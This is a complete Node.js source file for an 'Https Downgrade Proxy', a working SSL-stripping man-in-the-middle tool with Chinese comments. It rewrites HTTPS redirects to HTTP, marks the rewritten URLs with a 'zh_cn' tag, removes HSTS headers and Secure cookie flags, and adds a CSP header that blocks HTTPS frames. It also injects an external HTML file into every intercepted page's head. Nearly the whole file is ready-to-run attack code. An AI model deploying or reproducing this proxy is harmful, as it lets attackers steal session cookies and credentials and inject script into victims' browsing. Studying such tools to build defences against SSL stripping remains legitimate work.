/**
 * Https Downgrade Proxy
 *   @version 0.0.4
 *   @author EtherDream
 */
'use strict';

var $http = require('http'),
    $https = require('https'),
    $zlib = require('zlib'),
    $url = require('url'),
    $fs = require('fs');

$http.globalAgent.maxSockets = 10;

// 阻止 https 框架頁
var CSP_BLOCK_HTTPS = "default-src * data 'unsafe-inline' 'unsafe-eval'; frame-src http://*";



init(8080);

function init(port) {
    var svr = $http.createServer(onRequest);

    svr.listen(port, function() {
        console.log('running...');
    });

    svr.on('error', function() {
        console.error('listen fail');
    });
}

function fail(res) {
    res.writeHead(404);
    res.end();
}

/**
 * client 端 request
 */
var UA_SYMBOL = ' HiJack';
var R_URL = /^http:\/\/[^/]*(.*)/i;

function onRequest(req, res) {
    var headers = req.headers;

    // check host headers
    var host = headers.host;
    if (!host) {
        return fail(res);
    }

    // 阻止循環代理
    var ua = headers['user-agent'];
    if (!ua || ua.indexOf(UA_SYMBOL) >= 0) {
        return fail(res);
    }
    headers['user-agent'] = ua + UA_SYMBOL;

    // GET 絕對路徑 (正向代理)
    var m = req.url.match(R_URL);
    if (m) {
        // 取相對路徑
        req.url = m[1];
    }

    // 只允許我支持的演算法
    headers['accept-encoding'] = 'gzip,deflate';

    // 關鍵:檢查是否為向下轉型的https request
    var useSSL;
    if (isFakeUrl(req.url)) {
        req.url = upgradeUrl(req.url);
        useSSL = true;
    }

    //只要是安全網頁引用，大體都屬https
    var refer = headers['referer'];
    if (refer && isFakeUrl(refer)) {
        headers['referer'] = upgradeUrl(refer);
        useSSL = true;
    }

    // 代理轉發 forward
    forward(req, res, useSSL);
}

/**
 * 代理請求發起
 */
function forward(req, res, ssl) {
    var host = req.headers.host;
    var site = host;
    var port = ssl? 443 : 80;

    // 目標端口
    var p = host.indexOf(':');
    if (p != -1) {
        site = host.substr(0, p);
        port = +host.substr(p + 1);
        if (!port) {
            return fail(res);
        }
    }

    //console.log('[Go] ' + (ssl? 'https://' : 'http://') + host + req.url);

    // request parameteres
    var options = {
        method: req.method,
        host: site,
        port: port,
        path: req.url,
        headers: req.headers
    };

    // 代理請求
    var fnRequest = ssl? $https.request : $http.request;

    var midReq = fnRequest(options, function(serverRes) {
        handleResponse(req, res, serverRes);
    });

    midReq.on('error', function(err) {
        // 如果https request 失敗 嘗試 http 版本 requerst
        if (ssl) {
            forward(req, res, false);
        }
    });

    req.pipe(midReq);
}

/**
 * 處理 response 數據
 */
var R_GZIP = /gzip/i,
    R_DEFLATE = /deflate/i;

function handleResponse(clientReq, clientRes, serverRes) {
    var svrHeader = serverRes.headers;
    var usrHeader = clientReq.headers;

    // SSL 相關檢測
    sslCheck(clientReq, clientRes, serverRes);


    // 如果不是網頁資源:直接轉發
    var mime = svrHeader['content-type'] || '';
    var pos = mime.indexOf(';');
    if (pos >= 0) {
        mime = mime.substr(0, pos);
    }
    if (mime != 'text/html') {
        clientRes.writeHead(serverRes.statusCode, svrHeader);
        serverRes.pipe(clientRes);
        return;
    }


    // data flow 壓縮
    var istream, ostream,
        svrEnc = svrHeader['content-encoding'],
        usrEnc = usrHeader['accept-encoding'];

    if (svrEnc) {                             // 網頁被壓縮?
        if (R_GZIP.test(svrEnc)) {            // - GZIP 演算法
            istream = $zlib.createGunzip();

            if (R_GZIP.test(usrEnc)) {
                ostream = $zlib.createGzip();
            }
        }
        else if (R_DEFLATE.test(svrEnc)) {    // - DEFALTE 演算法
            istream = $zlib.createInflateRaw();

            if (R_DEFLATE.test(usrEnc)) {
                ostream = $zlib.createDeflateRaw();
            }
        }
    }
    delete svrHeader['content-length'];

    //
    // 輸入流（ 服務端接收流 > 解壓流)
    //  > 處理 >
    // 輸出流 ( 壓縮流 > 客戶端發送流)
	//
    if (istream) {
        serverRes.pipe(istream);
    }
    else {
        istream = serverRes;
    }

    if (ostream) {
        ostream.pipe(clientRes);
    }
    else {
        ostream = clientRes;
        delete svrHeader['content-encoding'];
    }

    // 利用 CSP 策略 阻止訪問 https 頁面
    svrHeader["content-security-policy"] = CSP_BLOCK_HTTPS;

    // 返回 response headers
    clientRes.writeHead(serverRes.statusCode, svrHeader);

    // 處理數據流 injection
    processInject(istream, ostream);
}


// -------------------- injector --------------------

// inject html
var mInjectHtml = $fs.readFileSync('inject.html');

// The position to inject
var INJECT_TAG = /^<head/i;
var N = 5;

/**
 * 搜索 chunk 中的可注入點
 * Return 注入位置 沒有則 return -1
 */
function findInjectPos(chunk) {
    console.log("findInjectPos");
    for(var i = N, n = chunk.length; i < n; i++) {
        // 搜索 '>'
        if (chunk[i] != 62) continue;

        // 獲取前面的 N 個字元
        var tag = chunk.toString('utf8', i - N, i);

        // 看看是否想要注入的位置??
        if (INJECT_TAG.test(tag)) {
            return i + 1;
        }
    }
    return -1;
}

function processInject(istream, ostream) {
    console.log("processInject");
    function onData(chunk) {
        var pos = findInjectPos(chunk);
        if (pos >= 0) {
            var begin = chunk.slice(0, pos);
            var tail = chunk.slice(pos, chunk.length);

            ostream.write(begin);           // 前面的部分
            ostream.write(mInjectHtml);     // 注入的內容
            ostream.write(tail);            // 後面的部分

            istream.pipe(ostream);          // 後面的數據交給底層轉發
            istream.removeListener('data', onData);
            istream.removeListener('end', onEnd);
        }
        else {
            console.log("Can not find inject");
            ostream.write(chunk);
        }
    }

    function onEnd() {
        ostream.end();
    }

    istream.on('data', onData);
    istream.on('end', onEnd);
}



// -------------------- sslproxy --------------------
var FAKE_SYMBOL = 'zh_cn';
var R_FAKE = /[?&]zh_cn$/;
var R_HTTPS = /^https:/i;
var R_HTTP = /^http:/i;


function isFakeUrl(url) {
    return R_FAKE.test(url);
}

function downgradeUrl(url) {
    // change protocol, and make a mark
    return url
        .replace(R_HTTPS, 'http:') +
        (url.indexOf('?') >= 0 ? '&' : '?') + FAKE_SYMBOL;
}

function upgradeUrl(url) {
    // change protocol, and remove mark
    return url
        .replace(R_HTTP, 'https:')
        .replace(R_FAKE, '');
}


function sslCheck(clientReq, clientRes, serverRes) {
    var svrHeader = serverRes.headers;

    // 刪除 HSTS
    delete svrHeader['strict-transport-security'];

    // 刪除 secure cookie
    var cookies = svrHeader['set-cookie'];
    if (cookies) {
        for(var i = cookies.length - 1; i >= 0; i--) {
            cookies[i] = cookies[i].replace(/;\s*secure/i, '');
        }
    }

    // 是否重新定向 https
    var statusCode = serverRes.statusCode;
    if (statusCode != 304 && 300 < statusCode && statusCode < 400) {

        var redir = svrHeader['location'];
        if (redir && R_HTTPS.test(redir)) {
            console.warn('[!] redir to:', redir);
            svrHeader['location'] = downgradeUrl(redir);
        }
    }
}
